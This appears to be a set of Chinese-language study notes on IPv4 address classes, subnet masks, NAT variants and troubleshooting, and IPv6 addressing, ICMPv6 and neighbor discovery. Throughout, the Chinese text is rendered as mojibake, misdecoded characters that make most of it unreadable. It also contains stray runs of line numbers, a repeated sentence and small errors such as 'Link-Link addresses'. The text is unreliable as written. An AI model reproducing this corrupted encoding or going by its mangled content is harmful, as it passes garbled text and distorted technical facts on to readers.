223Dç±»åœ°å€ç”¨äºå¤šæ’­ï¼ˆmulticasting, directed broadcasting, å—å¯¼å‘çš„å¹¿æ’­ï¼‰ï¼Œè€ŒEç±»åœ°å€åˆ™ä»…ç”¨äºå®éªŒç”¨é€”ã€‚Dç±»åœ°å€ç”¨äºå¤šæ’­ï¼ˆmulticasting, directed broadcasting, å—å¯¼å‘çš„å¹¿æ’­ï¼‰ï¼Œè€ŒEç±»åœ°å€åˆ™ä»…ç”¨äºå®éªŒç”¨é€”ã€‚ å­ç½‘æ©ç åˆæ­¥ï¼ŒSubnet Mask Primer1234567891011121314151617181920212223242526272829å…ˆå‰æåˆ°è¿‡ IP åœ°å€ç”¨äºåŒºåˆ†ç½‘ç»œçš„éƒ¨åˆ†ä»¥åŠç”¨äºåŒºåˆ†ç½‘ç»œä¸Šä¸»æœºåœ°å€çš„éƒ¨åˆ†ã€‚å­ç½‘æ©ç çš„ä½œç”¨å°±æ˜¯ç¡®ç«‹æ­¤ä¸¤éƒ¨åˆ†ã€‚éš¾ç‚¹å°±åœ¨äºå¹¶ä¸æ€»æ˜¯èƒ½ä»…ä»…çœ‹ä¸€çœ¼å­ç½‘æ©ç ï¼Œå°±èƒ½çŸ¥é“ IP åœ°å€çš„ç½‘ç»œéƒ¨åˆ†å’Œä¸»æœºéƒ¨åˆ†ã€‚è¿™éœ€è¦å®è·µï¼Œä¸”å¯¹äºé‚£äº›æ›´éš¾çš„åœ°å€ï¼Œä½ å°±å¿…é¡»è¦åŠ¨æ‰‹è®¡ç®—å‡ºæ¥ï¼ˆæˆ–æ˜¯ä½¿ç”¨æŸä¸ªå­ç½‘è®¡ç®—ç¨‹åºæ¥ä½œå¼Šï¼‰ã€‚å°±ç®—æœªæ›¾å°†ç½‘ç»œåˆ’åˆ†æˆæ›´å°çš„éƒ¨åˆ†ï¼Œä½ ä»éœ€é‡‡ç”¨ä¸ºç”¨åˆ°çš„æ¯ä¸ªåœ°å€åº”ç”¨ä¸€ä¸ªå­ç½‘æ©ç ã€‚è€Œä¸Šé¢æåˆ°çš„åœ°å€ç±»ï¼Œå®ƒä»¬éƒ½æœ‰ä¸€ä¸ªé»˜è®¤çš„å­ç½‘æ©ç ï¼Œå¦‚åŒä¸‹é¢è¿™æ ·ã€‚Aç±»åœ°å€ = 255.0.0.0 Bç±»åœ°å€ = 255.255.0.0 Cç±»åœ°å€ = 255.255.255.0åœ¨äºŒè¿›åˆ¶ä½å¼€å¯æ—¶ï¼Œç½‘ç»œå°±çŸ¥é“è¯¥ä½æ˜¯ç”¨ä½œç½‘ç»œåœ°å€ï¼Œè€Œä¸æ˜¯ç½‘ç»œä¸Šçš„ä¸»æœºåœ°å€ï¼Œå¦‚ä¸‹è¡¨æ‰€ç¤ºã€‚- - - -192 168 12 2255 255 255 0ç½‘ç»œä½ ç½‘ç»œä½ ç½‘ç»œä½ ä¸»æœºä½ä¸Šé¢çš„åœ°å€è¡¨æ˜ 192.168.12 æ˜¯ç½‘ç»œåœ°å€ï¼Œ2 æ˜¯è¯¥ç½‘ç»œä¸Šçš„ä¸€å°ä¸»æœºã€‚å†è€…ï¼Œä»»ä½•ä»¥192.168.12å¼€å¤´çš„ IP åœ°å€ï¼Œéƒ½æ˜¯åœ¨åŒä¸€ç½‘ç»œä¸Šçš„ã€‚è€Œåœ¨çœ‹çœ‹å‰8ä½çš„æ•°å­—ï¼Œä»¥åŠè¯¥é»˜è®¤çš„å­ç½‘æ©ç ï¼Œå°±çŸ¥é“è¿™æ˜¯ä¸€ä¸ªCç±»ç½‘ç»œã€‚è¯·è®°ä½æ—©å‰æåˆ°çš„è§„åˆ™ï¼šä¸»æœºæ‰€ä¸èƒ½ä½¿ç”¨çš„é‚£äº›ç½‘ç»œå·ï¼Œé‚£ä¹ˆä¸‹é¢çš„è¿™äº›ç½‘ç»œå·å°±ä¸èƒ½ä¸ºè®¾å¤‡æ‰€ä½¿ç”¨äº†ã€‚10.0.0.0174.12.0.0192.168.2.0å¦ä¸€è§„åˆ™æ˜¯ä½ ä¸èƒ½ä½¿ç”¨å„ä¸ªç½‘ç»œæˆ–å­ç½‘ä¸Šçš„å¹¿æ’­åœ°å€ã€‚æŸå¹¿æ’­åœ°å€æ˜¯å‰å¾€ç½‘ç»œä¸Šæ‰€æœ‰è®¾å¤‡ï¼Œé‚£ä¹ˆï¼Œé€»è¾‘ä¸Šå°±ä¸èƒ½ä¸ºè®¾å¤‡æ‰€ä½¿ç”¨äº†ã€‚å¹¿æ’­åœ°å€å°±æ˜¯å°†æ‰€æœ‰ä¸»æœºä½å¼€å¯çš„åœ°å€ï¼Œåƒä¸‹é¢è¿™æ ·ã€‚10.255.255.255192.168.1.255åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œä¸»æœºéƒ¨åˆ†çš„æ‰€æœ‰äºŒè¿›åˆ¶ä½éƒ½æ˜¯æ‰“å¼€çš„ã€‚ NAT åŸºç¡€ï¼ŒNAT BasicsNATæ¦‚è¿° NATï¼ˆNetwork Address Translationï¼‰ï¼Œç½‘ç»œåœ°å€è½¬æ¢ ä¸»è¦åº”ç”¨åœ¨ä¼ä¸šç½‘ç»œçš„è¾¹ç¼˜è®¾å¤‡ä¸Š å¯¹æ•°æ®åŒ…çš„ç§æœ‰IPåœ°å€å’Œå…¬æœ‰IPåœ°å€è¿›è¡Œè½¬æ¢ï¼Œå®ç°å†…ç½‘åˆ°å¤–ç½‘çš„è®¿é—® å®ç°ä¼ä¸šå†…ç½‘çš„ä¿æŠ¤ï¼Œå¢å¼ºä¼ä¸šå†…ç½‘çš„å®‰å…¨æ€§ã€‚å› ä¸ºå¤–ç½‘æ— æ³•ç›´æ¥è®¿é—®å†…éƒ¨è®¾å¤‡çš„ç§æœ‰IPåœ°å€ NATå·¥ä½œåŸç† è·¯ç”±å™¨å¯¹æ•°æ®åŒ…è¿›è¡Œåœ°å€è½¬æ¢ï¼Œè·¯ç”±å™¨åœ¨æ¥æ”¶åˆ°å†…éƒ¨æ•°æ®åŒ…æ—¶å°†å†…éƒ¨æºIPåœ°å€è½¬åŒ–ä¸ºå…¬æœ‰IPåœ°å€ååœ¨è¿›è¡Œè·¯ç”±è½¬å‘ã€‚ NATæ ¸å¿ƒå·¥ä½œè¡¨ï¼šNATè½¬æ¢è¡¨ NATæŠ€æœ¯ï¼šå®ç°å¤–ç½‘è®¿é—®å†…ç½‘å‡å¦‚ç”µè„‘Aæƒ³è¦è®¿é—®ç™¾åº¦ï¼Œç™¾åº¦çš„IPæˆ‘ä»¬å‡è®¾ä¸ºï¼š172.168.30.3ï¼š æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œç”µè„‘Açš„IPæ˜¯æˆ‘ä»¬è™šæ„çš„ï¼Œå®é™…ä¸Šå¯èƒ½å¹¶ä¸å­˜åœ¨è¿™æ ·ä¸€ä¸ªIPï¼Œå¦‚æœç”¨ç”µè„‘Açš„IPå»è®¿é—®ç™¾åº¦ï¼Œé‚£è‚¯å®šè¡Œä¸é€šã€‚ æˆ‘ä»¬ä¹ŸçŸ¥é“ï¼Œç”±äºç™¾åº¦å’Œç”µè„‘Aä¸åœ¨ä¸€ä¸ªå±€åŸŸç½‘å†…ï¼Œæ‰€ä»¥Aè¦è®¿é—®ç™¾åº¦ï¼Œé‚£ä¹ˆå¿…é¡»å¾—ç»è¿‡ç½‘å…³ã€‚è€Œç½‘å…³çš„è¿™ä¸ªIPåœ°å€ï¼Œæ˜¯çœŸå®å­˜åœ¨çš„ï¼Œæ˜¯å¯ä»¥è®¿é—®ç™¾åº¦çš„ã€‚ ä¸ºäº†è®© A å¯ä»¥è®¿é—®ç™¾åº¦ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é‡‡å–è¿™æ ·çš„æ–¹æ³•ï¼šè®©ç½‘å…³å»å¸®åŠ© A è®¿é—®ï¼Œç„¶åç™¾åº¦æŠŠç»“æœä¼ é€’ç»™ç½‘å…³ï¼Œè€Œç½‘å…³å†æŠŠç»“æœä¼ é€’ç»™ Aï¼Œè¿™æ ·ä¸å°±å¯ä»¥è§£å†³äº†? ä¸è¿‡ç”µè„‘Aã€Bã€Céƒ½å¯èƒ½æ‹œæ‰˜ç½‘å…³å»å¸®å¿™è®¿é—®ç™¾åº¦ï¼Œè€Œç™¾åº¦è¿”å›çš„ç»“æœ çš„ç›®çš„IPéƒ½æ˜¯ç½‘å…³çš„IP&#x3D;192.168.1.1ã€‚é‚£ä¹ˆç½‘å…³è¯¥å¦‚ä½•è¿›è¡ŒåŒºåˆ†è¿™ç»“æœæ˜¯Açš„ã€Bçš„è¿˜æ˜¯Cçš„å‘¢? æˆ‘ä»¬å»è®¿é—®ç™¾åº¦çš„æ—¶å€™ï¼Œä¸æ˜¯éœ€è¦æŒ‡å®šä¸€ä¸ªç«¯å£å—?åªè¦æˆ‘ä»¬æŠŠ Açš„IP + ç«¯å£ æ˜ å°„æˆ ç½‘å…³çš„IP+ç«¯å£ï¼Œä¸å°±å¯ä»¥å”¯ä¸€ç¡®å®šèº«ä»½äº†? ä¾‹å¦‚Aç”¨ç«¯å£60å»è®¿é—®ç™¾åº¦ï¼Œç½‘å…³æŠŠ Açš„IP+ç«¯å£60 æ˜ å°„æˆ ç½‘å…³çš„IP+ç«¯å£80 ä¸å°±å¯ä»¥äº†? ç™¾åº¦æŠŠç»“æœè¿”å›ç»™ç½‘å…³çš„80ç«¯å£ä¹‹åï¼Œç½‘å…³å†é€šè¿‡æ˜ å°„è¡¨ï¼Œå°±å¯ä»¥æŠŠç»“æœè¿”å›ç»™ Açš„60ç«¯å£ äº†ã€‚ å¦‚æœBä¹Ÿæ˜¯ç”¨60ç«¯å£å»è®¿é—®ç™¾åº¦çš„è¯ï¼Œä¹Ÿæ˜¯ä¸€æ ·ï¼Œå¯ä»¥æŠŠå®ƒæ˜ å°„åˆ°90ç«¯å£ã€‚ è¿™ç§æ–¹æ³•åœ°å€çš„æ˜ å°„è½¬æ¢ï¼Œæˆ‘ä»¬ä¹Ÿç§°ä¹‹ä¸ºç½‘ç»œåœ°å€è½¬æ¢ï¼Œè‹±æ–‡ä¸º Network Address Translationï¼Œç®€ç§°NATã€‚ è€ŒåƒAã€Bã€Cè¿™æ ·çš„IPåœ°å€æˆ‘ä»¬ä¹Ÿç§°ä¹‹ä¸ºå†…ç½‘IPï¼Œå³å†…ç½‘IP;è€Œåƒç½‘å…³ï¼Œç™¾åº¦è¿™æ ·çš„IPæˆ‘ä»¬ç§°ä¹‹ä¸ºå¤–ç½‘IP(å³äº’è”ç½‘å…¬ç½‘IP)ã€‚ é™æ€naté™æ€NAT NATè¡¨æ¡ç›®æ˜¯é€šè¿‡æ‰‹åŠ¨é…ç½®çš„æ–¹å¼æ·»åŠ è¿›å»çš„ ç§æœ‰IPåœ°å€å’Œå…¬æœ‰IPåœ°å€æ˜¯ 1å¯¹1 çš„å…³ç³»ï¼Œä¸èŠ‚çœå…¬ç½‘IPåœ°å€ é™æ€NATå¯ä»¥å®ç°å†…ç½‘çš„PC1ä¸å¤–ç½‘çš„è®¾å¤‡çš„äº’é€šï¼Œä½†æ˜¯å†…ç½‘çš„å…¶å®ƒè®¾å¤‡æ— æ³•ä¸å¤–ç½‘çš„è®¾å¤‡äº’é€š é™æ€NATå­˜åœ¨çš„å¼Šç«¯ï¼š é™æ€NATä¸­ç§æœ‰åœ°å€å’Œå…¬æœ‰åœ°å€æ˜¯1:1çš„å…³ç³»ï¼Œå¹¶ä¸èŠ‚çœå…¬ç½‘IPåœ°å€ å†…ç½‘ä¸»æœºéå¸¸å¤šçš„æ—¶å€™ï¼Œä¸èŠ‚çœé…ç½®ï¼Œå¹¶ä¸”æµªè´¹é’± åŠ¨æ€nat å’Œ natåœ°å€æ± åŠ¨æ€NAT NATè¡¨ä¸­çš„æ¡ç›®æ˜¯ è·¯ç”±å™¨å‡ºç‚‰æ•°æ®åŒ… æ—¶è‡ªåŠ¨å½¢æˆçš„ åŸºäºNATåœ°å€æ±  å®ç°ç§æœ‰åœ°å€å’Œå…¬æœ‰åœ°å€ä¹‹é—´çš„è½¬æ¢ï¼Œæ¯”é™æ€NATæ›´åŠ èŠ‚çœå…¬ç½‘IP å…¬å¸å†…éƒ¨ç§æœ‰åœ°å€ä¸»æœºæ•°é‡éå¸¸å¤šçš„æ—¶å€™ï¼Œå¦‚æœæ‰æœ‰é™æ€NATä¸ºæ¯ä¸ªç§æœ‰IPåœ°å€ï¼Œå°±ä¼šæµªè´¹å…¬ç½‘IPåœ°å€ åœ¨åŠ¨æ€NATä¸­ï¼Œä¼ä¸šå¯ä»¥åŒæ—¶è´­ä¹°å¤šä¸ªå…¬ç½‘IPåœ°å€ï¼Œç„¶åå°†è¿™äº›å…¬ç½‘IPåœ°å€ï¼Œè½®ç€ç»™ä¼ä¸šå†…ç½‘çš„æ¯ä¸ªä¸»æœºä½¿ç”¨ ç«¯å£NATï¼ˆPATï¼‰ åœ¨åŠ¨æ€NATæŠ€æœ¯çªå‡ºçš„ä¸»è¦çŸ›ç›¾å°±æ˜¯ï¼šç”¨æ¥è¿›è¡Œåœ°å€è½¬æ¢çš„å…¬ç½‘åœ°å€å¤ªå°‘äº†ã€‚ ä»¥ååœ¨è¿›è¡Œåœ°å€è½¬æ¢çš„æ—¶å€™ï¼Œä¸ä»…ä»…æ˜¯è½¬æ¢åœ°å€ï¼Œè¿˜è½¬æ¢ç«¯å£ å› ä¸ºä¸€ä¸ªå…¬ç½‘åœ°å€ï¼Œæœ€å¤šå¯ä»¥å¯¹åº” 65536 ä¸ªç«¯å£å· è¯¥æ¥å£ä¸Šå¦‚æœæ”¶åˆ°äº†ä¸€ä¸ªç›®æ ‡IPåœ°å€ä¸º 100.1.1.20 çš„ TCP 80 çš„æµé‡ é‚£ä¹ˆå°±å°†è¿™ä¸ªç›®æ ‡IPåœ°å€è½¬æ¢ä¸º 192.168.10.10 çš„ tcp 80 ã€‚ NAT Serverå¦‚æœæƒ³è¦å®ç°å¤–ç½‘åˆ°å†…ç½‘çš„è®¿é—®é‚£ä¹ˆå¿…é¡»å¾—åœ¨å…¬å¸çš„è¾¹ç•Œè®¾ï¼ˆR1ï¼‰ä¸Šï¼Œæå‰è®¾ç½®â€œnatè½¬æ¢æ¡ç›®â€å¹¶ä¸”è¿™ç§æ¡ç›®ï¼Œä»…ä»…å…è®¸æŸä¸€ç§ç‰¹å®šçš„ä¸šåŠ¡çš„æµé‡ã€‚ ä¼ä¸šå†…éƒ¨æœ‰ä¸€ä¸ª web æœåŠ¡å™¨ï¼Œç§æœ‰IPåœ°å€ 192.168.10.10&#x2F;24 å¸Œæœ›äº’è”ç½‘ç”¨æˆ·ï¼Œé€šè¿‡æµè§ˆå™¨ï¼Œè®¿é—®å…¬ç½‘åœ°å€ 100.1.1.20 ï¼Œå°±å¯ä»¥è·å¾—æˆ‘ä»¬å…¬å¸å†…éƒ¨çš„ web æœåŠ¡å™¨çš„ç½‘ç«™ natæ•…éšœæ’æŸ¥123NAT æ•…éšœä¸­åæ¬¡æœ‰ä¹æ¬¡ï¼Œéƒ½æ˜¯ç”±äºè·¯ç”±å™¨ç®¡ç†å‘˜å¿˜è®°äº†æŠŠip nat outsideæˆ–ip nat insideå‘½ä»¤åŠ åˆ°è·¯ç”±å™¨æ¥å£ä¸Šã€‚äº‹å®ä¸Šï¼Œå‡ ä¹æ€»æ˜¯å­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼æ¥ä¸‹æ¥æœ€é¢‘ç¹çš„é”™è¯¯åŒ…æ‹¬ä¸æ­£ç¡®çš„ ACL ï¼Œä»¥åŠæŸä¸ªæ‹¼å†™é”™è¯¯çš„åœ°å€æ± åç§°ï¼ˆåœ°å€æ± æ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼‰ã€‚ä½¿ç”¨å‘½ä»¤debug ip nat [detailed]ï¼Œå¯ä»¥åœ¨è·¯ç”±å™¨ä¸Šå¯¹ NAT è½¬æ¢è¿›è¡Œè°ƒè¯•ï¼Œåˆå¯ä»¥ä½¿ç”¨å‘½ä»¤sh ip nat translationsï¼Œæ¥æŸ¥çœ‹ NAT åœ°å€æ± ã€‚ æ•°æ®åŒ…ä»å†…ç½‘åˆ°å¤–ç½‘ æ€ä¹ˆè½¬æ¢ï¼šç§æœ‰â†’å…¬æœ‰ è½¬æ¢å¯¹è±¡ï¼šæºIPåœ°å€ å†æŸ¥NATè¡¨ï¼Œå®ç°åœ°å€è½¬æ¢ å…ˆæŸ¥è·¯ç”±è¡¨ï¼Œä¸ºäº†ç¡®å®šå‡ºç«¯å£ æ•°æ®åŒ…ä»å¤–ç½‘åˆ°å†…ç½‘ å…ˆæŸ¥NATè¡¨ï¼Œå®ç°åœ°å€è½¬æ¢ å†æŸ¥è·¯ç”±è¡¨ï¼Œç¡®å®šå»å¾€å†…ç½‘ä¸»æœºçš„ç«¯å£ è½¬æ¢å¯¹è±¡ï¼šç›®æ ‡IPåœ°å€ æ€ä¹ˆè½¬æ¢ï¼šå…¬æœ‰â†’ç§ ipv6æ­£ç¡®æè¿° IPv6 çš„å„ç§åœ°å€ å…¨çƒå•æ’­åœ°å€, Global Unicast addresses å¤šæ’­åœ°å€, Multicast addresses æœ¬åœ°é“¾è·¯åœ°å€, Link-Link addresses æœ¬åœ°å”¯ä¸€åœ°å€ï¼ŒUnique-Local addresses æ‰©å±•å”¯ä¸€è¯†åˆ«ç¬¦ï¼ŒExtended Unified Identifier 64, EUI-64 è‡ªåŠ¨é…ç½®åœ°å€ï¼ˆ autoconfiguration ï¼‰ historyåœ¨Tim Berners-Leeçˆµå£«äº1989å¹´å‘æ˜ WWW æ—¶ï¼Œä»–æ— æ³•é¢„æµ‹åˆ°è¯¥æŠ€æœ¯å¯¹ä¸–ç•Œçš„å·¨å¤§å½±å“ã€‚ä¸ªäººè®¡ç®—æœºæ›¾ç»è´µå¾—é«˜æ”€ä¸èµ·ï¼Œæ­¤å¤–ï¼Œé™¤éèƒ½å¤Ÿè´Ÿæ‹…å¾—èµ·æ˜‚è´µçš„ WAN è¿æ¥è´¹ç”¨ï¼Œå¦åˆ™å°±æ²¡æœ‰æ–¹ä¾¿çš„é•¿è·ç¦»é€šä¿¡æ–¹æ³•ã€‚é‚£æ—¶ä¹Ÿæ²¡æœ‰å¤§å®¶å…±åŒéµå¾ªçš„é€šä¿¡æ¨¡å‹ã€‚ é‚£æ—¶ï¼ŒæŸäº›äº‹éœ€è¦ä¸€äº›å˜åŒ–ï¼Œä»¥ IP è¿™ç§æ–°å‹åˆ†å€æ ‡å‡†çš„çš„å½¢å¼ï¼Œå˜é©å‘ç”Ÿäº†ã€‚ä¸šç•Œä»çŠ¯ä¸‹çš„å¤§é‡å¤±è¯¯ä¸­ç»ˆæœ‰æ”¶è·ï¼Œå¹¶åœ¨å¯¹å•†ä¸šéœ€æ±‚çš„å›åº”ä¸‹ï¼Œ IETF æ—©åœ¨1998å¹´å°±å‘å¸ƒäº†ä¼—å¤š IPv6 æ ‡å‡†ä¸­æœ€æ—©çš„ä¸€äº›æ ‡å‡†ã€‚ å¹¶ä¸ä¼šæœ‰ä¸€ä¸ªæ—¥æœŸï¼Œèƒ½å¤Ÿæ•´ä¸ªåœ°ä» IPv4 è½¬å˜ä¸º IPv6 ï¼›è€Œæ˜¯ç½‘ç»œå°†ä¼šé€æ¸åœ°å˜ä¸ºåŒæ—¶è¿è¡Œ IPv4 å’ŒIPv6, å¹¶æœ€ç»ˆ IPv4 ä¼šæ»šç²—ã€‚å½“ä¸‹ï¼Œå…¨éƒ¨äº’è”ç½‘æµé‡çš„è¿‘1%è¿è¡Œåœ¨ IPv6 ä¸Šï¼ˆæ¥æºï¼šYves Poppe, IPv6 â€“ A 2012 Report Cardï¼‰ã€‚ IPv6ä¸‹çš„ICMP123ICMPv6æ˜¯IPv6çš„åŸºç¡€åè®®ä¹‹ä¸€ï¼Œç”¨äºå‘æºèŠ‚ç‚¹ä¼ é€’æŠ¥æ–‡è½¬å‘çš„ä¿¡æ¯æˆ–è€…é”™è¯¯ã€‚åè®®ç±»å‹å·ï¼ˆNext Headerï¼‰ï¼š58ICMPv6é™¤äº†æä¾›IPv4åŠŸèƒ½ä¹‹å¤–ï¼Œè¿˜æä¾›äº†é‚»å±…å‘ç°ã€æ— çŠ¶æ€åœ°å€é…ç½®ã€é‡å¤åœ°å€æ£€æµ‹ã€PMTUå‘ç°ç­‰ç­‰ ICMPv6æŠ¥å¤´å­—æ®µTypeï¼šè¡¨æ˜æ¶ˆæ¯çš„ç±»å‹ï¼Œ0è‡³127è¡¨ç¤ºå·®é”™æŠ¥æ–‡ç±»å‹ï¼Œ128è‡³255è¡¨ç¤ºæ¶ˆæ¯æŠ¥æ–‡ç±»å‹ã€‚Codeï¼šè¡¨ç¤ºæ­¤æ¶ˆæ¯ç±»å‹ç»†åˆ†çš„ç±»å‹ã€‚Checksumï¼šè¡¨ç¤ºICMPv6æŠ¥æ–‡çš„æ ¡éªŒå’Œã€‚ é”™è¯¯æŠ¥æ–‡ç›®çš„ä¸å¯è¾¾é”™è¯¯æŠ¥æ–‡ï¼šåœ¨IPv6èŠ‚ç‚¹è½¬å‘IPv6æŠ¥æ–‡è¿‡ç¨‹ä¸­ï¼Œå½“è®¾å¤‡å‘ç°ç›®çš„åœ°å€ä¸å¯è¾¾æ—¶ï¼Œå°±ä¼šå‘å‘é€æŠ¥æ–‡çš„æºèŠ‚ç‚¹å‘é€ICMPv6ç›®çš„ä¸å¯è¾¾é”™è¯¯æŠ¥æ–‡ï¼ŒåŒæ—¶æºå¸¦é”™è¯¯æŠ¥æ–‡çš„å…·ä½“åŸå› ã€‚ æ•°æ®åŒ…è¿‡å¤§é”™è¯¯æŠ¥æ–‡ï¼šåœ¨IPv6èŠ‚ç‚¹è½¬å‘IPv6æŠ¥æ–‡è¿‡ç¨‹ä¸­ï¼Œå‘ç°æŠ¥æ–‡è¶…è¿‡å‡ºæ¥å£çš„é“¾è·¯MTUæ—¶ï¼Œåˆ™å‘å‘é€æŠ¥æ–‡çš„æºèŠ‚ç‚¹å‘é€ICMPv6æ•°æ®åŒ…è¿‡å¤§é”™è¯¯æŠ¥æ–‡ï¼Œå…¶ä¸­æºå¸¦å‡ºæ¥å£çš„é“¾è·¯MTUå€¼ã€‚æ•°æ®åŒ…è¿‡å¤§é”™è¯¯æŠ¥æ–‡æ˜¯Path MTUå‘ç°æœºåˆ¶çš„åŸºç¡€ã€‚ æ—¶é—´è¶…æ—¶é”™è¯¯æŠ¥æ–‡ï¼šå½“è·¯ç”±å™¨æ”¶åˆ°Hop Limitå­—æ®µå€¼ç­‰äº0çš„æ•°æ®åŒ…ï¼Œæˆ–è€…å½“è·¯ç”±å™¨å°†Hop Limitå­—æ®µå€¼å‡ä¸º0æ—¶ï¼Œä¼šå‘å‘é€æŠ¥æ–‡çš„æºèŠ‚ç‚¹å‘é€ICMPv6è¶…æ—¶é”™è¯¯æŠ¥æ–‡ã€‚å¯¹äºåˆ†æ®µé‡ç»„æŠ¥æ–‡çš„æ“ä½œï¼Œå¦‚æœè¶…è¿‡å®šæ—¶æ—¶é—´ï¼Œä¹Ÿä¼šäº§ç”Ÿä¸€ä¸ªICMPv6è¶…æ—¶æŠ¥æ–‡ã€‚ å‚æ•°é”™è¯¯æŠ¥æ–‡ï¼šå½“ç›®çš„èŠ‚ç‚¹æ”¶åˆ°ä¸€ä¸ª IPv6 æŠ¥æ–‡æ—¶ï¼Œä¼šå¯¹æŠ¥æ–‡è¿›è¡Œæœ‰æ•ˆæ€§æ£€æŸ¥ï¼Œå¦‚æœå‘ç°é—®é¢˜ä¼šå‘æŠ¥æ–‡çš„æºèŠ‚ç‚¹å›åº”ä¸€ä¸ª ICMPv6 å‚æ•°é”™è¯¯å·®é”™æŠ¥æ–‡ã€‚ IPv6é‚»å±…å‘ç°åè®®NDPThe IPv6 Neighbor Discovery Protocol, NDP NDPå®ç°äº†IPv6ä¸­è®¸å¤šé‡è¦æœºåˆ¶ è·¯ç”±å™¨å‘ç°å¸®åŠ©è®¾å¤‡å‘ç°é“¾è·¯ä¸Šçš„è·¯ç”±å™¨ï¼Œå¹¶è·å¾—è·¯ç”±å™¨é€šå‘Šçš„ä¿¡æ¯ã€‚ æ— çŠ¶æ€è‡ªåŠ¨é…ç½®é€šè¿‡è·¯ç”±å™¨é€šå‘Šçš„åœ°å€å‰ç¼€ï¼Œç»ˆç«¯è‡ªåŠ¨ç”ŸæˆIPv6åœ°å€ã€‚æ— çŠ¶æ€è‡ªåŠ¨é…ç½®æœºåˆ¶ä½¿ç”¨åˆ°äº†ICMPv6ä¸­çš„è·¯ç”±å™¨è¯·æ±‚æŠ¥æ–‡ï¼ˆRSï¼‰åŠè·¯ç”±å™¨é€šå‘ŠæŠ¥æ–‡ï¼ˆRAï¼‰ã€‚ DADé‡å¤åœ°å€æ£€æµ‹è·å¾—åœ°å€åï¼Œè¿›è¡Œåœ°å€é‡å¤æ£€æµ‹ï¼Œç¡®ä¿åœ°å€ä¸å­˜åœ¨å†²çªã€‚ä¸€ä¸ªIPv6åœ°å€å¿…é¡»ç»å†é‡å¤åœ°å€æ£€æµ‹å¹¶é€šè¿‡æ£€æµ‹ä¹‹åæ‰èƒ½å¤Ÿå¯ç”¨ã€‚ åœ°å€è§£æè¯·æ±‚ç›®çš„ç½‘ç»œåœ°å€å¯¹åº”çš„æ•°æ®é“¾è·¯å±‚åœ°å€ï¼Œç±»ä¼¼IPv4çš„ARPã€‚ä½¿ç”¨NDPæ‰€å®šä¹‰çš„é‚»å±…è¯·æ±‚æŠ¥æ–‡ï¼ˆNSï¼‰åŠé‚»å±…é€šå‘ŠæŠ¥æ–‡ï¼ˆNAï¼‰æ¥å®ç°åœ°å€è§£æåŠŸèƒ½ã€‚ é‚»å±…çŠ¶æ€è·Ÿè¸ªé€šè¿‡NDPå‘ç°é“¾è·¯ä¸Šçš„é‚»å±…å¹¶è·Ÿè¸ªé‚»å±…çŠ¶æ€ã€‚IPv6å®šä¹‰äº†èŠ‚ç‚¹ä¹‹é—´é‚»å±…çš„çŠ¶æ€æœºï¼ŒåŒæ—¶è¿˜ç»´æŠ¤é‚»å±…IPv6åœ°å€ä¸äºŒå±‚åœ°å€å¦‚MACçš„æ˜ å°„å…³ç³»ï¼Œç›¸åº”çš„è¡¨é¡¹å­˜å‚¨äºè®¾å¤‡çš„IPv6é‚»å±…è¡¨ä¸­ã€‚ å‰ç¼€é‡ç¼–å€è·¯ç”±å™¨å¯¹æ‰€é€šå‘Šçš„åœ°å€å‰ç¼€è¿›è¡Œçµæ´»è®¾ç½®å®ç°ç½‘ç»œé‡ç¼–å€ã€‚IPv6è·¯ç”±å™¨èƒ½å¤Ÿé€šè¿‡ICMPv6çš„è·¯ç”±å™¨é€šå‘ŠæŠ¥æ–‡ï¼ˆRAï¼‰å‘é“¾è·¯ä¸Šé€šå‘ŠIPv6å‰ç¼€ä¿¡æ¯ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œä¸»æœºèƒ½å¤Ÿä»RAä¸­æ‰€åŒ…å«çš„å‰ç¼€ä¿¡æ¯è‡ªåŠ¨æ„å»ºè‡ªå·±çš„IPv6å•æ’­åœ°å€ã€‚å½“ç„¶è¿™äº›è‡ªåŠ¨è·å–çš„åœ°å€æ˜¯æœ‰ç”Ÿå­˜æ—¶é—´çš„ã€‚é€šè¿‡åœ¨RAä¸­é€šå‘ŠIPv6åœ°å€å‰ç¼€ï¼Œå¹¶ä¸”çµæ´»åœ°è®¾å®šåœ°å€çš„ç”Ÿå­˜æ—¶é—´ï¼Œèƒ½å¤Ÿå®ç°ç½‘ç»œä¸­IPv6æ–°ã€è€å‰ç¼€çš„å¹³æ»‘è¿‡æ¸¡ï¼Œè€Œæ— éœ€åœ¨ä¸»æœºç»ˆç«¯ä¸Šæ¶ˆè€—å¤§é‡çš„æ‰‹å·¥åŠ³åŠ¨é‡æ–°é…ç½®åœ°å€ã€‚ è·¯ç”±é‡å®šå‘å‘ŠçŸ¥å…¶ä»–è®¾å¤‡ï¼Œåˆ°è¾¾ç›®æ ‡ç½‘ç»œçš„æ›´ä¼˜ä¸‹ä¸€è·³ IPv6çš„æœ‰çŠ¶æ€è‡ªåŠ¨é…ç½®IPv6æ— çŠ¶æ€è‡ªåŠ¨é…ç½®IPv6å’ŒIPv4æŠ¥å¤´æ¯”è¾ƒå»é™¤äº†IHLã€æ ‡è¯†ã€flagsã€åˆ†æ®µåç§»ã€é¦–éƒ¨æ•ˆéªŒ IPv6åœ°å€è¡¨ç¤ºç®€åŒ–è§„åˆ™1ï¼šæ¯ä¸€ä¸ªåœ°å€å—çš„èµ·å§‹éƒ¨åˆ†çš„0å¯ä»¥çœç•¥æ‰ç®€åŒ–è§„åˆ™2: æœ‰1ä¸ªæˆ–è¿ç»­å¤šä¸ª0ç»„æˆçš„åœ°å€å—å¯ä»¥ç”¨â€::â€å–ä»£ IPv6åœ°å€ç»“æ„ç½‘ç»œå‰ç¼€ï¼šç›¸å½“äºIPv4ä¸­çš„ç½‘ç»œä½æ¥å£IDï¼šç›¸å½“äºIPv4ä¸­çš„ä¸»æœºä½æ¥å£IDçš„ä¸‰ç§ç”Ÿæˆæ–¹æ³•ï¼šâ‘ æ‰‹å·¥é…ç½®â‘¡ç³»ç»Ÿé€šè¿‡è½¯ä»¶è‡ªåŠ¨ç”Ÿæˆâ‘¢EUI-64 